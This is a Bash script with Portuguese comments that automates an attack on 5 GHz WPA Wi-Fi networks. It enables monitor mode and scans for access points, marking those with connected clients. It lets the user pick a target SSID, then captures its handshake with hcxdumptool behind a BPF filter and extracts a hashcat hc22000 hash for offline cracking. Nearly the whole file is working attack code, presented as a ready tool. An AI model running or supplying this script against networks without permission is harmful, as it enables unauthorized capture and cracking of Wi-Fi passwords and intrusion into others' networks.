#!/usr/bin/env bash
set -e

INTERFACE="$1"
SSID="$2"

if [ -z "$INTERFACE" ] ; then
    echo "Uso: $0 <interface> "
    exit 1
fi

prep() {
    # Limpeza de arquivos antigos
    echo "[-] Limpando arquivos antigos e parando processos..."
    sudo pkill airodump-ng 2>/dev/null || true
    sudo pkill hcxdumptool 2>/dev/null || true

    # Remover arquivos antigos
    rm -f dumpfile.pcapng attack.bpf hash.hc22000 scan5g-01.csv 2>/dev/null || true

    # Verifica se a interface normal existe
    echo "[-] Procurando interface $INTERFACE..."
    if iw dev | grep -qw "$INTERFACE"; then
        echo "[-] Interface normal $INTERFACE encontrada. Ativando modo monitor..."
        sudo airmon-ng start "$INTERFACE" >/dev/null 2>&1

        # Agora tenta capturar a interface em modo monitor
        INTERFACE_MON=$(iw dev | awk '$1=="Interface"{print $2}' | grep -E "^${INTERFACE}mon$|mon$")
        if [ -z "$INTERFACE_MON" ]; then
            print_red "[!] Não foi possível detectar interface em modo monitor após ativar."
            exit 1
        fi
        print_green "[*] Interface em modo monitor: $INTERFACE_MON"

    # Se não encontrou interface normal, tenta encontrar interface com sufixo "mon"
    elif iw dev | grep -qw "${INTERFACE}mon"; then
        INTERFACE_MON="${INTERFACE}mon"
        print_green "[*] Interface em modo monitor $INTERFACE_MON encontrada."

    else
        print_red "[!] Interface '$INTERFACE' ou '${INTERFACE}mon' não encontrada."
        exit 1
    fi

}

scan_bssid() {
    if [ -n "$SSID" ]; then
        # SSID já passado como parâmetro, só rodar scan rápido pra pegar BSSID e canal
        echo "[-] Procurando SSID: '$SSID'"
        
        sudo airodump-ng "$INTERFACE_MON" --band a -w scan5g --output-format csv > /dev/null 2>&1 &
        PID=$!
        sleep 30
        sudo kill -2 $PID
        wait $PID

    else
        # Sem SSID, abre fzf para seleção
        echo "[-] Escaneando redes (30s) para seleção interativa de SSID..."

        sudo airodump-ng "$INTERFACE_MON" --band a -w scan5g --output-format csv > /dev/null 2>&1 &
        PID=$!
        sleep 30
        sudo kill -2 $PID
        wait $PID

        # Extrai BSSIDs dos APs com clientes conectados (da seção Stations)
        CLIENT_BSSIDS=$(awk -F, '
            BEGIN {clients_section=0}
            /^Station MAC/ {clients_section=1; next}
            clients_section == 1 && NF > 1 {
                bssid = $6
                gsub(/[ \t\r\n]+/, "", bssid)
                if (bssid != "" && bssid != "(not associated)") print bssid
            }
        ' scan5g-01.csv | sort -u)

        # Passa lista para awk como variável separada por espaço
        CLIENTS="$CLIENT_BSSIDS"

        SSIDS=$(awk -F, -v clients="$CLIENT_BSSIDS" '
            BEGIN {
                IGNORECASE=1
                n = split(clients, arr_clients, " ")
                for (i=1; i<=n; i++) client_map[arr_clients[i]] = 1
                print "Power\tSSID      \tPossible Clients"
            }
            /^BSSID/ {next}
            /^$/ {exit}
            {
                bssid = $1
                power = $9
                ssid = $14
                gsub(/^[ \t\r\n]+|[ \t\r\n]+$/, "", ssid)
                if (length(ssid) > 0) {
                    flag = (bssid in client_map) ? "*" : ""
                    print power "\t" ssid "\t" flag
                }
            }
        ' scan5g-01.csv | sort -nrk1)

        if ! command -v fzf >/dev/null 2>&1; then
            print_red "[!] fzf não está instalado. Instale para usar a seleção interativa."
            exit 1
        fi

        SELECTION=$(echo "$SSIDS" | fzf --header-lines=1 --prompt="Escolha o SSID alvo (Power, SSID, Client): ")

        if [ -z "$SELECTION" ]; then
            print_red "[!] Nenhuma rede selecionada. Abortando."
            exit 1
        fi

        # A SSID pode vir com * no final, remover esse * se existir
        SSID=$(echo "$SELECTION" | awk -F'\t' '{print $2}')
        echo "[-] SSID selecionado: $SSID"
    fi

    # Extrair BSSID e canal do SSID escolhido/recebido
    BSSID=$(awk -F, -v ssid="$SSID" '
        BEGIN{IGNORECASE=1}
        /^BSSID/{next}
        /^$/ {exit}
        $14 ~ ssid {print $1; exit}
    ' scan5g-01.csv | xargs)

    CHANNEL=$(awk -F, -v ssid="$SSID" '
        BEGIN{IGNORECASE=1}
        /^BSSID/{next}
        /^$/ {exit}
        $14 ~ ssid {print $4; exit}
    ' scan5g-01.csv | xargs)

    if [ -z "$BSSID" ] || [ -z "$CHANNEL" ]; then
        print_red "[!] SSID '$SSID' não encontrado no scan."
        exit 1
    fi

    print_green "[*] Encontrado: BSSID=$BSSID, Canal=$CHANNEL"
    sleep 1
}

create_filter() {
    echo "[-] Criando filtro BPF..."
    BSSID_FILTER=$(echo "$BSSID" | tr -d ':' | tr 'A-F' 'a-f')
    sudo tcpdump -s 65535 -y IEEE802_11_RADIO \
      "wlan addr3 $BSSID_FILTER or wlan addr3 ffffffffffff" \
      -ddd > attack.bpf

    print_green "[*] Filtro BPF criado com sucesso."
    sleep 1
}

get_handshake() {
    echo "[-] Capturando handshake..."
    sudo hcxdumptool -i "$INTERFACE_MON" -c "${CHANNEL}b" --bpf=attack.bpf -w dumpfile.pcapng
}

extract_hash() {
    echo "[-] Extraindo hash..."
    sleep 1
    hcxpcapngtool -o hash.hc22000 dumpfile.pcapng
    print_green "[*] Hash extraído com sucesso: hash.hc22000"
}

reset_interface() {
    if [[ "$INTERFACE_MON" == *mon ]]; then
        echo "[-] Parando modo monitor na interface $INTERFACE_MON..."
        sudo airmon-ng stop "$INTERFACE_MON"
        
        echo "[-] Tentando reativar interface $INTERFACE..."
        sudo ip link set "$INTERFACE" up

    else
        echo "[-] Interface $INTERFACE_MON não está em modo monitor, nada a resetar."
    fi
}

print_green() {
  echo -e "\e[32m$1\e[0m"
}

print_red() {
  echo -e "\e[31m$1\e[0m"
}

main() {
    prep
    scan_bssid
    create_filter
    get_handshake
    reset_interface
    extract_hash
}

main
